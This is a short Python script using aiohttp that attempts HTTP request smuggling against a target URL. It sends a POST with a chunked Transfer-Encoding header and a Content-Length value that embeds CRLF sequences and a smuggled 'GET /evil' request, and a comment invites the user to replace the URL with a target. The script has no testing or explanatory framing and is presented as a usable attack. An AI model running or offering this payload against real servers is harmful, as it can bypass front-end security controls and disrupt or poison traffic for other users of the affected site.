import aiohttp
import asyncio

async def fetch(url):
    headers = {
        'Transfer-Encoding': 'chunked',
        'Content-Length': '0\r\n\r\nGET /evil HTTP/1.1\r\nHost: example.com\r\n\r\n'
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers) as response:
            return await response.text()

async def main():
    url = 'http://example.com'  # Replace with the target URL
    response = await fetch(url)
    print(response)

if __name__ == '__main__':
    asyncio.run(main())